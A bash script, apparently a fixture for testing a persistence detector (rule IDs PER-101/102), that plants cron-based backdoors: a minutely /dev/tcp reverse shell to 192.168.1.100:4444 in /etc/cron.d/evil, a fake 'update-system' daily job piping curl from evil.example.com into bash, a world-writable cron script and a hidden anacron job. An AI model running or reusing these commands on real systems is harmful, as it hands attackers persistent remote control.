#!/bin/bash
# Cron-based Persistence Mechanisms
set -e

echo "[*] Configuring cron persistence..."

# Suspicious cron job - reverse shell attempt pattern
echo "* * * * * root bash -c 'exec 5<>/dev/tcp/192.168.1.100/4444;cat<&5|while read line;do \$line 2>&5>&5;done' &" > /etc/cron.d/evil
chmod 644 /etc/cron.d/evil

# PER-101: Cron job in cron.daily
cat > /etc/cron.daily/update-system << 'CRON'
#!/bin/bash
# Looks like a system update but runs suspicious command
curl -s http://evil.example.com/checkin | bash
CRON
chmod +x /etc/cron.daily/update-system

# PER-101: World-writable cron script
chmod 777 /etc/cron.daily/update-system

# Anacron job (PER-102)
cat >> /etc/anacrontab << 'ANACRON'
# Suspicious anacron job
1 15 test.job /bin/bash -c "/usr/local/bin/.bashdb -c 'echo vulnerable'"
ANACRON

echo "[+] Cron persistence configured"
